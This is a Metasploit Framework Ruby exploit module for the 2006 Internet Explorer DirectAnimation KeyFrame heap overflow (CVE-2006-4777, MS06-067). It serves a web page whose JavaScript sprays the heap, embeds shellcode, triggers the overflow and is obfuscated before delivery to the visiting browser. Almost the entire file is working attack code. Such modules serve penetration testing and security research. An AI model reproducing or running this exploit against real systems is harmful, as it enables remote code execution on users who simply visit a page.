##
# $Id: ms06_067_keyframe.rb 9842 2010-07-16 02:33:25Z jduck $
##

##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://metasploit.com/framework/
##

require 'msf/core'

class Metasploit3 < Msf::Exploit::Remote
	Rank = NormalRanking

	#
	# This module acts as an HTTP server
	#
	include Msf::Exploit::Remote::HttpServer::HTML


	#
	# Superceded by ms10_018_ie_behaviors, disable for BrowserAutopwn
	#
	#include Msf::Exploit::Remote::BrowserAutopwn
	#autopwn_info({
	#	:ua_name    => HttpClients::IE,
	#	:ua_minver  => "6.0",
	#	:javascript => true,
	#	:os_name    => OperatingSystems::WINDOWS,
	#	:vuln_test  => 'KeyFrame',
	#	:classid    => 'DirectAnimation.PathControl',
	#	:rank       => NormalRanking  # reliable memory corruption
	#})

	def initialize(info = {})
		super(update_info(info,
			'Name'           => 'Internet Explorer Daxctle.OCX KeyFrame Method Heap Buffer Overflow Vulnerability',
			'Description'    => %q{
				This module exploits a heap overflow vulnerability in the KeyFrame method of the
				direct animation ActiveX control.  This is a port of the exploit implemented by
				Alexander Sotirov.
			},
			'License'        => MSF_LICENSE,
			'Author'         =>
				[
					# Did all the hard work
					'Alexander Sotirov <asotirov@determina.com>',
					# Integrated into msf
					'skape',
				],
			'Version'        => '$Revision: 9842 $',
			'References'     =>
				[
					[ 'CVE', '2006-4777' ],
					[ 'OSVDB', '28842' ],
					[ 'BID', '20047' ],
					[ 'MSB', 'MS06-067' ],
					[ 'URL', 'https://www.blackhat.com/presentations/bh-eu-07/Sotirov/Sotirov-Source-Code.zip' ]
				],
			'DefaultOptions' =>
				{
					'EXITFUNC' => 'process',
				},
			'Payload'        =>
				{
					# Maximum payload size is limited by heaplib
					'Space'       => 870,
					'MinNops'     => 32,
					'Compat'      =>
						{
							'ConnectionType' => '-find',
						},
					'StackAdjustment' => -3500,
				},
			'Platform'       => 'win',
			'Targets'        =>
				[
					[ 'Windows 2000/XP/2003 Universal', { }],
				],
			'DisclosureDate' => 'Nov 14 2006',
			'DefaultTarget'  => 0))
	end

	def on_request_uri(cli, request)
		return if ((p = regenerate_payload(cli)) == nil)

		print_status("Sending #{self.name} to #{cli.peerhost}:#{cli.peerport}...")

		# This is taken directly from Alex's exploit -- all credit goes to him.
		trigger_js = heaplib(
			"var target = new ActiveXObject('DirectAnimation.PathControl');\n" +
			"var heap = new heapLib.ie();\n" +
			"var shellcode = unescape('#{Rex::Text.to_unescape(p.encoded)}');\n" +
			"var jmpecx = 0x4058b5;\n" +
			"var vtable = heap.vtable(shellcode, jmpecx);\n" +
			"var fakeObjPtr = heap.lookasideAddr(vtable);\n" +
			"var fakeObjChunk = heap.padding((0x200c-4)/2) + heap.addr(fakeObjPtr) + heap.padding(14/2);\n" +
			"heap.gc();\n" +
			"for (var i = 0; i < 100; i++)\n" +
			"  heap.alloc(vtable)\n" +
			"heap.lookaside(vtable);\n" +
			"for (var i = 0; i < 100; i++)\n" +
			"  heap.alloc(0x2010)\n" +
			"heap.freeList(fakeObjChunk, 2);\n" +
			"target.KeyFrame(0x40000801, new Array(1), new Array(1));\n" +
			"delete heap;\n")

		# Obfuscate it up a bit
		trigger_js = obfuscate_js(trigger_js,
			'Symbols' =>
				{
					'Variables' => [ 'target', 'heap', 'shellcode', 'jmpecx', 'fakeObjPtr', 'fakeObjChunk' ]
				})

		# Fire off the page to the client
		send_response(cli,
			"<html><script language='javascript'>#{trigger_js}</script></html>")

		# Handle the payload
		handler(cli)
	end

end
